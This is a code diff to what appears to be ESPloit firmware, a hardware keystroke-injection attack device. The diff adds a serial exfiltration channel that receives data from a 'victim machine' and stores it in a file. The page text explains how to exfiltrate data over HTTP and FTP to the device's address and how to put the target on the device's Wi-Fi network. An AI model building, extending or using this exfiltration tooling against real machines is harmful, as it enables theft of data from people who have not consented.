@@ -604,7 +604,7 @@ void ListPayloads(){
   String FileList = "<a href=\"/esploit\"><- BACK TO INDEX</a><br><br>";
   Dir dir = SPIFFS.openDir(directory);
   if(server.uri() == "/listpayloads") FileList += "File System Info Calculated in Bytes<br><b>Total:</b> "+total+" <b>Free:</b> "+freespace+" "+" <b>Used:</b> "+used+"<br><br><a href=\"/uploadpayload\">Upload Payload</a><br><br><a href=\"/livepayload\">Live Payload Mode</a><br><br><table border='1'><tr><td><b>Display Payload Contents</b></td><td><b>Size in Bytes</b></td><td><b>Run Payload</b></td><td><b>Download File</b></td><td><b>Delete Payload</b></td></tr>";
-  if(server.uri() == "/exfiltrate/list") FileList += String()+F("To exfiltrate data be sure ESPloit and Target machine are on the same network.<br>Either set ESPloit to join the Target's network or set the Target to join ESPloit's AP.<br><small>Current Network Configuration: ESPloit's IP= <b>")+local_IPstr+"</b> SSID = <b>"+ssid+"</b> PASSWORD = <b>"+password+"</b><br>Windows: netsh wlan set hostednetwork mode=allow ssid=\"<b>"+ssid+"</b>\" key=\"<b>"+password+"</b>\"<br>Linux: nmcli dev wifi connect <b>"+ssid+"</b> password <b>"+password+"</b></small><br>For HTTP exfiltration method point the target machine to the url listed below:<br><small>http://<b>"+local_IPstr+"</b>/exfiltrate?file=<b>FILENAME.TXT</b>&data=<b>EXFILTRATED-DATA-HERE</b></small><br>For FTP exfiltration method use the credentials listed below:<br><small>Server: <b>"+local_IPstr+"</b> Username: <b>"+ftp_username+"</b> Password: <b>"+ftp_password+"</b></small><br>See the example payloads for more in depth examples.<br><br>File System Info Calculated in Bytes<br><b>Total:</b> "+total+" <b>Free:</b> "+freespace+" "+" <b>Used:</b> "+used+"<br><br><table border='1'><tr><td><b>Display File Contents</b></td><td><b>Size in Bytes</b></td><td><b>Download File</b></td><td><b>Delete File</b></td></tr>";
+  if(server.uri() == "/exfiltrate/list") FileList += String()+F("To exfiltrate data using the serial method find the com port device is connected to<br>then be sure to set the baud rate to 38400 on the victim machine<br>and send the text \"SerialEXFIL:\" followed by the data to exfiltrate.<br>To exfiltrate data using the WiFi methods be sure ESPloit and Target machine are on the same network.<br>Either set ESPloit to join the Target's network or set the Target to join ESPloit's AP.<br><small>Current Network Configuration: ESPloit's IP= <b>")+local_IPstr+"</b> SSID = <b>"+ssid+"</b> PASSWORD = <b>"+password+"</b><br>Windows: netsh wlan set hostednetwork mode=allow ssid=\"<b>"+ssid+"</b>\" key=\"<b>"+password+"</b>\"<br>Linux: nmcli dev wifi connect <b>"+ssid+"</b> password <b>"+password+"</b></small><br>For HTTP exfiltration method point the target machine to the url listed below:<br><small>http://<b>"+local_IPstr+"</b>/exfiltrate?file=<b>FILENAME.TXT</b>&data=<b>EXFILTRATED-DATA-HERE</b></small><br>For FTP exfiltration method use the credentials listed below:<br><small>Server: <b>"+local_IPstr+"</b> Username: <b>"+ftp_username+"</b> Password: <b>"+ftp_password+"</b></small><br>See the example payloads for more in depth examples.<br><br>File System Info Calculated in Bytes<br><b>Total:</b> "+total+" <b>Free:</b> "+freespace+" "+" <b>Used:</b> "+used+"<br><br><table border='1'><tr><td><b>Display File Contents</b></td><td><b>Size in Bytes</b></td><td><b>Download File</b></td><td><b>Delete File</b></td></tr>";
   while (dir.next()) {
     String FileName = dir.fileName();
     File f = dir.openFile("r");
@@ -1162,7 +1162,14 @@ void loop() {
         if(cmd == "Version"){
           ardversion = Serial.readStringUntil('\n');
         }
+        if(cmd == "SerialEXFIL"){
+          String SerialEXFIL = Serial.readStringUntil('\n');
+          File f = SPIFFS.open("/SerialEXFIL.txt", "a");
+          f.println(SerialEXFIL);
+          f.close();
+        }
   }
+  
   //Serial.print("Free heap-");
   //Serial.println(ESP.getFreeHeap(),DEC);
 }
